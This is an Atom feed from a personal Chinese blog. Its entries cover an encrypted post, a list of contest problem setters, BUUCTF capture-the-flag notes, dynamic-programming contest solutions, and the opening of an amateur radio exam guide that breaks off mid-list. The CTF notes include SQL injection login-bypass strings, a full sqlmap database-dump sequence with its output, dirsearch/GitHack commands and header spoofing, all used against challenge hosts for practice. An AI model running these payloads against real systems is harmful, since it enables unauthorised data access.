<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fluorine&#39;s blog</title>
  
  <subtitle>73 DE BG2MJG HPE CUAGN TU E E</subtitle>
  <link href="https://narafluorine.github.io/atom.xml" rel="self"/>
  
  <link href="https://narafluorine.github.io/"/>
  <updated>2025-12-27T05:32:43.624Z</updated>
  <id>https://narafluorine.github.io/</id>
  
  <author>
    <name>Fluorine Wengers</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>passwd=fluorine</title>
    <link href="https://narafluorine.github.io/2025/12/27/00018_passwd_equals_fluorine/"/>
    <id>https://narafluorine.github.io/2025/12/27/00018_passwd_equals_fluorine/</id>
    <published>2025-12-27T05:22:59.000Z</published>
    <updated>2025-12-27T05:32:43.624Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c30bb311e005f1e9c120719914359e70e3203850f6c9bd76d6dbe9411cbdabae">664c765e203872821a5f437664e5d43fc15dc8ba92590d2b03d3639e053549f1db3ccda1f11d9b0d1dcdb6311df4b4cc84ab6592d3b3490be18017d631d0fbce32881b49d201b88efff562fcbcf57052147d62a81457dbef2aa8c347333b068c8656c5d3834c45a583490f2c3bb09457155e9f083b0e47f766079ba85b8eaed486e026271b3cb68aef32f8ffae68991476880a7cdcdb295e18b09edc8b15e2aeaef74d9fe06a9c9a35e98307e7f63f58</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,这里需要密码喵.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了,需要输入密码查看喵.</summary>
    
    
    
    <category term="DEAD" scheme="https://narafluorine.github.io/categories/DEAD/"/>
    
    
    <category term="Hello" scheme="https://narafluorine.github.io/tags/Hello/"/>
    
  </entry>
  
  <entry>
    <title>XCPC命题组汇总</title>
    <link href="https://narafluorine.github.io/2025/12/16/30018_%E5%91%BD%E9%A2%98%E7%BB%84%E6%B1%87%E6%80%BB/"/>
    <id>https://narafluorine.github.io/2025/12/16/30018_%E5%91%BD%E9%A2%98%E7%BB%84%E6%B1%87%E6%80%BB/</id>
    <published>2025-12-16T02:16:10.000Z</published>
    <updated>2025-12-28T07:22:04.838Z</updated>
    
    <content type="html"><![CDATA[<p>似乎没人做哪场赛站是谁出的题的汇总…</p><h1>Nanani Fan Club</h1><ul><li><a href="https://codeforces.com/gym/105922">The 18th Jilin Provincial Collegiate Programming Contest/2025第十八届吉林省省赛</a></li></ul><h1>北邮</h1><h1>黑冰茶出题组</h1><h1>ZJU</h1><ul><li><a href="https://contest.ucup.ac/contest/1885">2024ICPC HK</a></li></ul><h1>SUA</h1><p>sua.ac自己查</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;似乎没人做哪场赛站是谁出的题的汇总…&lt;/p&gt;
&lt;h1&gt;Nanani Fan Club&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://codeforces.com/gym/105922&quot;&gt;The 18th Jilin Provincial Collegiate</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://narafluorine.github.io/2025/10/02/20017_buuctf/"/>
    <id>https://narafluorine.github.io/2025/10/02/20017_buuctf/</id>
    <published>2025-10-02T07:03:34.858Z</published>
    <updated>2025-12-17T17:15:31.244Z</updated>
    
    <content type="html"><![CDATA[<p>BUUCTF神秘题好多…补补脑洞…</p><h1>DASBOOK</h1><h2 id="第一章-1-4-7-案例解析-BUU-BURP-COURSE-1">[第一章][1.4.7 案例解析]BUU BURP COURSE 1</h2><p><code>X-Real-IP:127.0.0.1</code> 可能是检查&quot;只能在本地访问&quot;的标志之一.<br>注意payload一定要空两行,不然发出去什么都收不到.</p><h1>N1BOOK</h1><h2 id="第一章-web入门-常见的搜集">[第一章 web入门]常见的搜集</h2><p>不知道为什么别人用dirsearch扫,爆的快的不行,我自己用dirsearch整天吃429…<br><code>dirsearch -u http://your-target/ -t 10 --delay=1</code> 限速限线程版</p><h2 id="第一章-web入门-粗心的小李">[第一章 web入门]粗心的小李</h2><p>GitHack神秘工具发力了…<br><code>python GitHack.py http://xxx.cn/.git/</code></p><h1>Real</h1><h2 id="PHP-XXE">[PHP]XXE</h2><p><a href="https://github.com/vulhub/vulhub/blob/master/php/php_xxe">ref</a>虽然但是这个题直接搜索flag就有了是怎么回事…</p><h1>Crypto</h1><h2 id="达芬奇密码">达芬奇密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">达芬奇隐藏在蒙娜丽莎中的数字列:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 </span><br><span class="line">记录在达芬奇窗台口的神秘数字串:36968853882116725547342176952286</span><br></pre></td></tr></table></figure><p>这两个都是32长度,考虑置换变换.<br>然后有人会发现后面的序列就是斐波那契数列,然后就按照那个规律进行置换…</p><p>居然是按照斐波那契数列进行解密的…</p><h2 id="这是什么">这是什么</h2><p>apk里面包了一段jsfuck,用js+CPH judge跑出来即可.<br>有的时候解析网站反而会失败,我也不知道为什么</p><h2 id="keyboard">keyboard</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee</span><br></pre></td></tr></table></figure><p>这些字母对应着123456789…<br>然后每个字母出现次数在1-4范围内,联想九键键盘…</p><p>然后由于o这个值是9,对应九键键盘中 <code>WXYZ</code> 这一栏,出现三次意味着 <code>X</code> .</p><h2 id="这是什么觅🐎">这是什么觅🐎</h2><p>观察题…每周字母有两个,对应的密文也有两个…<br>那么我们初步认为是查表…<br>然后得到数字转字母.</p><h2 id="GWCTF-2019-BabyRSA">[GWCTF 2019]BabyRSA</h2><p>RSA部分白给,但是明文是按照顺序被拆分成a,b,然后给出 $a+b$ 和 $a^3+b^3$ …</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.abc <span class="keyword">import</span> a, b, c</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, d, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, d, n)</span><br><span class="line">res = solve([a + b - c1, <span class="built_in">pow</span>(a, <span class="number">3</span>) + <span class="built_in">pow</span>(b, <span class="number">3</span>) - c2], [a, b])</span><br><span class="line"></span><br><span class="line">f1 = res[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">f2 = res[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cun.long_to_bytes(f1) + cun.long_to_bytes(f2))</span><br></pre></td></tr></table></figure><p>上面好像有一个能解方程的好东西…</p><h2 id="samemod">samemod</h2><p><code>bz2</code> 文件,据说也是一种压缩文件…</p><p>共模攻击白给.<br>但是解出来的数字长这样:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1021089710312311910410111011910111610410511010710511610511511211111511510598108101125</span><br></pre></td></tr></table></figure><p>应该按照位置拆分ascii码…<br>怪不得long to bytes解不出来…</p><h2 id="BJDCTF2020-easyrsa">[BJDCTF2020]easyrsa</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z=Fraction(<span class="number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="number">1</span>,Derivative(arth(q),q))</span><br></pre></td></tr></table></figure><p>在给出e c n之后额外给出了这个…<br>ds说 <code>Derivative(f(b),b)</code> 是在函数内对某个东西求导.<br><code>Fraction(a,b)</code> 的意思是 $\frac ab$ …</p><h2 id="浪里淘沙">浪里淘沙</h2><p>把获得的单词连在一起提交即可。（我这里有一串数字：4，8，11，15，16）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tonightsuccessnoticenoticewewesuccesstonightweexamplecryptoshouldwebackspacetonightbackspaceexamplelearnwesublimlearnbackspacetheshouldwelearnfoundsublimsystemexamplesublimfoundlearnshouldmorningsublimsystemuserlearnthecryptomorningexamplenoticetonightlearntonightlearntonightsublimenterusermorningfoundtonightweenterfoundnoticethecryptomorningthebackspacelearntonightlearn...</span><br></pre></td></tr></table></figure><p>显然这段文字是由几个单词组成的,所以考虑提取出来.<br>替换…</p><p>然后呢???结果居然是词频统计然后给出出现次数第几小的东西???</p><h2 id="鸡藕椒盐味">鸡藕椒盐味</h2><p>公司食堂最新出了一种小吃，叫鸡藕椒盐味汉堡，售价八块钱，为了促销，上面有一个验证码，输入后可以再换取一个汉堡。但是问题是每个验证码几乎都有错误,而且打印的时候倒了一下。小明买到了一个汉堡，准备还原验证码，因为一个吃不饱啊 <s>验证码如下：1100 1010 0000 ,而且打印的时候倒了一下。把答案哈希一下就可以提交了。</s> (答案为正确值(不包括数字之间的空格)的32位md5值的小写形式) 注意：得到的 flag 请包上 flag{} 提交</p><p>奇偶校验位…<br>海明码…<br>reverse一下…<br>神人题目</p><h2 id="WUSTCTF2020-大数计算">[WUSTCTF2020]大数计算</h2><p>这也是个神人题目,拼好题不说还搞OSINT…</p><p>宇宙终极问题：求 $x,y,z$ 满足方程 $x^{3}+y^{3}+z^{3}=42$<br><a href="https://www.theregister.com/2019/09/07/three_cubes_problem/">ref</a></p><p>$$x=−80538738812075974$$$$y=80435758145817515$$$$z=12602123297335631$$</p><h2 id="AFCTF2018-花开藏宝地">[AFCTF2018]花开藏宝地</h2><p>又一道神秘题…<br>门限密码,神秘加密体系…<br>幸亏直接找脚本了,节省下不会还红温的时间…<br>exp(抄的):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a1 =</span><br><span class="line">d1 =</span><br><span class="line">a2 =</span><br><span class="line">d2 =</span><br><span class="line">a3 = </span><br><span class="line">d3 =</span><br><span class="line"></span><br><span class="line">dd = d1*d2*d3</span><br><span class="line">t1 = <span class="built_in">pow</span>(dd//d1,d1-<span class="number">2</span>,d1)</span><br><span class="line"><span class="keyword">assert</span>(t1*d2*d3%d1 == <span class="number">1</span>)</span><br><span class="line">t2 = <span class="built_in">pow</span>(dd//d2,d2-<span class="number">2</span>,d2)</span><br><span class="line"><span class="keyword">assert</span>(t2*d1*d3%d2 == <span class="number">1</span>)</span><br><span class="line">t3 = <span class="built_in">pow</span>(dd//d3,d3-<span class="number">2</span>,d3)</span><br><span class="line"><span class="keyword">assert</span>(t3*d2*d1%d3 == <span class="number">1</span>)</span><br><span class="line">s = a1*t1*d2*d3+a2*t2*d1*d3+a3*t3*d1*d2</span><br><span class="line">p = </span><br><span class="line">s %= dd</span><br><span class="line"><span class="comment"># print(hex(s))</span></span><br><span class="line">s %= p</span><br><span class="line">s = <span class="built_in">hex</span>(s)[<span class="number">2</span>:]</span><br><span class="line">flag = <span class="built_in">list</span>(<span class="built_in">bytearray</span>.fromhex(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h1>Web</h1><h2 id="常见文件头">常见文件头</h2><p><code>Referer</code> :你从哪个网页过来<br><code>User-Agent</code> :你使用哪个浏览器<br><code>X-Forwarded-For</code> :你的原始ip?</p><h2 id="常见SQL注入系列">常见SQL注入系列</h2><p>账号:<br>admin’ or 1=‘1密码:(随便填)<br>admin’ or 1='1</p><p>SQL转义???(好像转成web题了)username=&amp;password=or 1='1</p><h2 id="自动注入系列-SQL大手子">自动注入系列(SQL大手子)</h2><p>找注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1</span><br></pre></td></tr></table></figure><p>找所有数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1 --dbs</span><br></pre></td></tr></table></figure><p>回显:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] note</span><br><span class="line">[*] performance_schema</span><br></pre></td></tr></table></figure><p>找某个数据库中的表名(下面是note)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1 -D note -tables</span><br></pre></td></tr></table></figure><p>回显:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: note</span><br><span class="line">[2 tables]</span><br><span class="line">+-------+</span><br><span class="line">| fl4g  |</span><br><span class="line">| notes |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure><p>找这个列表下的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1 -D note -T fl4g --columns</span><br></pre></td></tr></table></figure><p>回显:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: note</span><br><span class="line">Table: fl4g</span><br><span class="line">[1 column]</span><br><span class="line">+---------+-------------+</span><br><span class="line">| Column  | Type        |</span><br><span class="line">+---------+-------------+</span><br><span class="line">| fllllag | varchar(40) |</span><br><span class="line">+---------+-------------+</span><br></pre></td></tr></table></figure><p>查看这个东西的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1 -D note -T fl4g -C fllllag --dump</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: note</span><br><span class="line">Table: fl4g</span><br><span class="line">[1 entry]</span><br><span class="line">+---------------------------------+</span><br><span class="line">| fllllag                         |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| n1book&#123;union_select_is_so_cool&#125; |</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure><p>查看当前数据库名???</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://fc37e90a-e533-4b4a-a8bd-7d02eab1fcb1.node5.buuoj.cn:81/backend/content_detail.php?id=1 --current-db</span><br></pre></td></tr></table></figure><h1>Reverse</h1><h2 id="MRCTF2020-Xor"><a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DXor">[MRCTF2020]Xor</a></h2><p>ida不知道为什么插件<a href="https://blog.csdn.net/xiangshangbashaonian/article/details/82889924">崩了</a>不能识别call的函数和参数.<br>解决办法:找到call的那个函数反编译一下,然后就能成功了.</p><h2 id="HDCTF2019-Maze"><a href="https://buuoj.cn/challenges#%5BHDCTF2019%5DMaze">[HDCTF2019]Maze</a></h2><p>花指令第一课.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        jmp label</span><br><span class="line">        _emit <span class="number">0xE8</span>  <span class="comment">// 假装是 call，其实是垃圾</span></span><br><span class="line">    label:</span><br><span class="line">        <span class="keyword">xor</span> eax, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样后面的函数可以正常运行,但是IDA会崩,因为 <code>0xE8</code> 被识别为 <code>call</code> ,后面就全乱套了.</p><p>为什么asm没事:直接jmp跳过去了.<br>为什么IDA炸了:IDA在猜每句话的作用,同时尝试还原高级语言,所以是逐句的翻译.</p><h3 id="hint">hint:</h3><p>选住数据按d把命令转换为字节数据.<br>选住数据开头按p把数据转换为命令数据.</p><p><a href="https://bbs.kanxue.com/thread-279604.htm">ref1</a> <a href="https://blog.csdn.net/abel_big_xu/article/details/117927674">ref2</a> <a href="https://blog.csdn.net/m0_46296905/article/details/117336574">ref3</a></p><h2 id="INSHack2019-Passthru">[INSHack2019]Passthru</h2><p>编辑-首选项-导入TLS key.然后就可以查看加密的流传输了.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;BUUCTF神秘题好多…
补补脑洞…&lt;/p&gt;
&lt;h1&gt;DASBOOK&lt;/h1&gt;
&lt;h2 id=&quot;第一章-1-4-7-案例解析-BUU-BURP-COURSE-1&quot;&gt;[第一章][1.4.7 案例解析]BUU BURP COURSE 1&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;X-Real</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://narafluorine.github.io/2025/09/14/20015_2025_%E7%BD%91%E7%BB%9C%E8%B5%9B/"/>
    <id>https://narafluorine.github.io/2025/09/14/20015_2025_%E7%BD%91%E7%BB%9C%E8%B5%9B/</id>
    <published>2025-09-13T17:42:52.549Z</published>
    <updated>2025-09-17T13:18:28.095Z</updated>
    
    <content type="html"><![CDATA[<h1><a href="https://qoj.ac/contest/2513">第一场网络赛</a></h1><h2 id="M">M</h2><p>题面:给你一个带边权的图,图上还有额外m条特殊边(0花费),但是有使用次数限制:<br>现在要你求出限制为0-n时从1到所有点的权值最小和</p><p>神仙dp题.我们考虑dp表示当前答案,枚举k,一点一点加边.如何模拟这个过程?假设dp为当前答案数组,每次加边的时候意味着uv两点权值是相同的.<br>但是为了防止加边传递(也就是出现一步走了好多边的情况),额外设置一个tmp表示当前最大值,用这个值去更新就可以了.</p><p>实际写的时候还有一个额外问题:先从根更新子树还是先从子树更新根节点?<br>答案是:必须先从子树更新根.</p><p>考虑这个情况(bc是特殊边):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a---b--e-f-g</span><br><span class="line"> \ /</span><br><span class="line">  c-d</span><br></pre></td></tr></table></figure><p>先更新子树会导致b节点回传c之后不会再更新d,就会WA.</p><h2 id="D">D</h2><p>给一棵树,每个点有点权,你现在要把某些边切开(没数量限制),最大化剩下的连通块的极差和.</p><p>感觉有很多树形dp的技巧不是能教出来的,必须自己写…<br>Flu赛时一直在想怎么维护这条链上的最大值最小值,所以到最后也没想出来…<br>结果赛后翻别人的题解才知道,可以用类似&quot;重力势能&quot;的方法维护单调的链.<br>我们维护dp[num][3],其中0表示节点num已经被使用了的结果,1表示强制num作为最小值出现的结果,2为强制num作为最大值出现的结果,那么作为最小值出现就有(假设g是所有子树的答案,节点num新开一条链,所以直接减掉或加上就行)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i:vc[num])&#123;</span><br><span class="line"><span class="keyword">if</span>(i==ko)<span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">dfs</span>(i,num);</span><br><span class="line">g+=dp[i][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">dp[num][<span class="number">0</span>]=g;</span><br><span class="line">dp[num][<span class="number">1</span>]=g-dat[num];<span class="comment">//num作为最小值出现</span></span><br><span class="line">dp[num][<span class="number">2</span>]=g+dat[num];<span class="comment">//num作为最大值出现</span></span><br></pre></td></tr></table></figure><p>这个时候我们在尝试把极差(一条单调链上的两端差)断成一条一条单独的边,而不是用dp维护链上的最大最小值.<br>比如说 <code>1-2-3</code> 这条链,1作为最小值,直接-1即可,2继承自1,当前2作为最大值出现,那么加上2即可.然后这个时候假设2也作为最小值出现的话,再减掉2即可,然后3继承2再加上3,答案就是-1+2-2+3=2.<br>这么做的好处是在合并链的时候,两条链可以直接权值相加,而不是枚举哪个作为最大值出现.</p><p>所以最后的代码长这样,我们的mx1和mx2指定两个最小值,分别是mx1作为最小值出现能带来最大的贡献(dp[num][1]-dp[num][0]最大):</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> num,<span class="type">int</span> ko)</span></span>&#123;</span><br><span class="line">i64 g=<span class="number">0</span>,mx1=<span class="number">0</span>,mx2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i:vc[num])&#123;</span><br><span class="line"><span class="keyword">if</span>(i==ko)<span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">dfs</span>(i,num);</span><br><span class="line">g+=dp[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(mx1==<span class="number">0</span>||(dp[i][<span class="number">1</span>]-dp[i][<span class="number">0</span>]&gt;dp[mx1][<span class="number">1</span>]-dp[mx1][<span class="number">0</span>]))&#123;</span><br><span class="line">mx2=mx1;</span><br><span class="line">mx1=i;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(mx2==<span class="number">0</span>||(dp[i][<span class="number">1</span>]-dp[i][<span class="number">0</span>]&gt;dp[mx2][<span class="number">1</span>]-dp[mx2][<span class="number">0</span>]))&#123;</span><br><span class="line">mx2=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">dp[num][<span class="number">0</span>]=g;</span><br><span class="line">dp[num][<span class="number">1</span>]=g-dat[num];<span class="comment">//num作为最小值出现</span></span><br><span class="line">dp[num][<span class="number">2</span>]=g+dat[num];<span class="comment">//num作为最大值出现</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i:vc[num])&#123;</span><br><span class="line"><span class="keyword">if</span>(i==ko)<span class="keyword">continue</span>;</span><br><span class="line">dp[num][<span class="number">1</span>]=<span class="built_in">max</span>(dp[num][<span class="number">1</span>],g+dp[i][<span class="number">1</span>]-dp[i][<span class="number">0</span>]);</span><br><span class="line">dp[num][<span class="number">2</span>]=<span class="built_in">max</span>(dp[num][<span class="number">2</span>],g+dp[i][<span class="number">2</span>]-dp[i][<span class="number">0</span>]);</span><br><span class="line">dp[num][<span class="number">0</span>]=<span class="built_in">max</span>(dp[num][<span class="number">0</span>],g+dat[num]+dp[i][<span class="number">1</span>]-dp[i][<span class="number">0</span>]);</span><br><span class="line">dp[num][<span class="number">0</span>]=<span class="built_in">max</span>(dp[num][<span class="number">0</span>],g-dat[num]+dp[i][<span class="number">2</span>]-dp[i][<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span>(i!=mx1)&#123;</span><br><span class="line">dp[num][<span class="number">0</span>]=<span class="built_in">max</span>(dp[num][<span class="number">0</span>],g-dp[i][<span class="number">0</span>]-dp[mx1][<span class="number">0</span>]+dp[mx1][<span class="number">1</span>]+dp[i][<span class="number">2</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(mx2!=<span class="number">0</span>)&#123;</span><br><span class="line">dp[num][<span class="number">0</span>]=<span class="built_in">max</span>(dp[num][<span class="number">0</span>],g-dp[i][<span class="number">0</span>]-dp[mx2][<span class="number">0</span>]+dp[mx2][<span class="number">1</span>]+dp[i][<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><a href="">第二场网络赛</a></h1><p>重大战略问题.神一刀鬼一刀的延续(这次是鬼一刀)<br>和msc的差距被拉到了200,和劳伦斯的差距被拉到了100,难搞…<br>下一场必须全力以赴了,不然名额真砍完了…</p><h2 id=""></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;a href=&quot;https://qoj.ac/contest/2513&quot;&gt;第一场网络赛&lt;/a&gt;&lt;/h1&gt;
&lt;h2 id=&quot;M&quot;&gt;M&lt;/h2&gt;
&lt;p&gt;题面:给你一个带边权的图,图上还有额外m条特殊边(0花费),但是有使用次数限制:&lt;br&gt;
现在要你求出限制为0-n时从1到</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>无线电B考试指南</title>
    <link href="https://narafluorine.github.io/2025/06/29/30020_%E6%97%A0%E7%BA%BF%E7%94%B5B/"/>
    <id>https://narafluorine.github.io/2025/06/29/30020_%E6%97%A0%E7%BA%BF%E7%94%B5B/</id>
    <published>2025-06-28T16:57:00.000Z</published>
    <updated>2025-06-29T13:20:58.277Z</updated>
    
    <content type="html"><![CDATA[<p>这里是中国业余无线电B证考试的指南.</p><p>Flu花了一天半的时间刷题备考看资料,最后以 <code>45/50</code> 的成绩过了B,故下面的内容不再维护.<br>(不过Flu心情好了可能改改排版什么的)</p><blockquote><p>速通是对的.<br>–Flu</p></blockquote><p>笔者建议大家考试前一两天然后就从零开始刷题,碰到不会的就看友台解析.<br>由于每个人的记忆点都可能不一样,下面的笔记很抽象,还是建议大家结合笔记看看自己怎么记忆.</p><p>先板刷真题,然后再解决完错题,然后再来一两场随机考试,就可以了.</p><p>没必要非常紧张,Flu的B证考试对于&quot;xxHz是什么波&quot;“xxHz是什么业务”&quot;XXX是什么发射类别&quot;这种纯记忆题全错了都能过,大家也一定没问题的,加油!</p><h2 id="ref">ref</h2><p>先看看有什么其他的可用资源…</p><p>微信有一个叫&quot;HAM模拟考试&quot;的小程序,没广告,巨好用.<br><a href="https://www.cqid.cn/">模拟考试网站(有谷歌系列的广告)</a><br><a href="https://www.jimmytian.com/archives/crac-aro-licence-b-review-guide.html">B证快速指北(笔者的这篇博客打算和这个博客是一个性质)</a><br><a href="https://github.com/bd8bzy/crac-exam-b">带解析的题库1</a><br><a href="https://www.bd8bzy.net/zh-CN/blog/crac-exam-b/">带解析的题库2</a><br><a href="https://ham-dev.c5r.app/crac-question-bank">带解析的题库3</a></p><h2 id="不得占用">不得占用</h2><p>435-438(38不能惹)145.8-146(要死了)</p><h2 id="发射类别">发射类别</h2><p>CW A1A<br>单边带话 J3E<br>单边带RTTY F2B<br>PSK31 G2B<br>调频话 